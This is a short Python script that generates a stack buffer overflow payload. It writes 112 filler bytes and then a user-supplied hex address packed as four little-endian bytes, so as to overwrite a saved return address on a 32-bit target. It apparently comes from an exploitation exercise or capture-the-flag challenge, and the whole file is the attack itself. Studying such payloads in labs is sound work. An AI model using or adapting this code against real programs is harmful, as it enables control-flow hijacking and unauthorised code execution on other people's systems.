#!/usr/bin/env python3
import sys

_, target = sys.argv
buflen = 100
junk = b'\xaf' * (buflen + 12)
sys.stdout.buffer.write(junk)

ret = int(target, base=16).to_bytes(4, byteorder='little')
sys.stdout.buffer.write(ret)